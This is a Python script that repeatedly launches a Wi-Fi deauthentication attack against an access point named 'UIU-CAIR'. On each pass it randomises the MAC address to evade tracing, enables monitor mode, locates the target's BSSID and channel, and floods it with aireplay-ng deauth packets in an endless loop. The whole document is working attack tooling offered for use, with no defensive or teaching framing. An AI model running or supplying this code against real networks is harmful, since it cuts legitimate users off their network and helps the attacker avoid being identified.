import os
import re
import subprocess


def start_deauth_attack(bssid, packets, interface):
    command = f'sudo aireplay-ng --deauth {packets} -a {bssid} {interface}'
    os.system(command)

def change_mac_adddress(interface):
    command = f'sudo ifconfig {interface} down'
    os.system(command)
    command = f'sudo macchanger -r {interface}'
    os.system(command)
    command = f'sudo ifconfig {interface} up'
    os.system(command)

def start_monitor_mode(interface):
    command = f'sudo airmon-ng start {interface}'
    os.system(command)

def set_channel(interface, channel):
    command = f'sudo iwconfig {interface} channel {channel}'
    os.system(command)


def get_essid_bssid_channel(essid, freqency):

    output = subprocess.check_output("sudo iwlist scan", shell=True)
    output_str = output.decode("utf-8")
    access_points = output_str.split('Cell')
    access_points.pop(0) # removed garbage header
    freqency = 'Frequency:' + freqency

    for AP in access_points:
        if essid in AP and freqency in AP:
            bssid = None
            channel = None
            essid = None
            essid_match = re.search(r'ESSID:"([^"]+)"', AP)
            if essid_match:
                essid = essid_match.group(1)
            bssid_match = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', AP)
            if bssid_match:
                bssid = bssid_match.group(1)
            channel_match = re.search(r'Channel:(\d+)', AP)
            if channel_match:
                channel = int(channel_match.group(1))
            return essid, bssid, channel



def start_attack_on_wifi():

    wifi_name = 'UIU-CAIR'
    frequency = '2.4'
    interface = 'wlxa09f10f030fd'
    deauth_packets = 50
    
    while True:
        try:
            change_mac_adddress(interface=interface)
            start_monitor_mode(interface=interface)
            essid, bssid, channel = get_essid_bssid_channel(essid=wifi_name, freqency=frequency)
            set_channel(interface=interface, channel=channel)

            print(f'\n\nStarting attack on ESSID: {essid}\t\tBSSID: {bssid}\tChannel: {channel}\n\n\n')
            start_deauth_attack(bssid=bssid, interface=interface, packets=deauth_packets)

        except Exception as err:
            print(f'Exception Error: {err}')
        

if __name__ == '__main__':
    start_attack_on_wifi()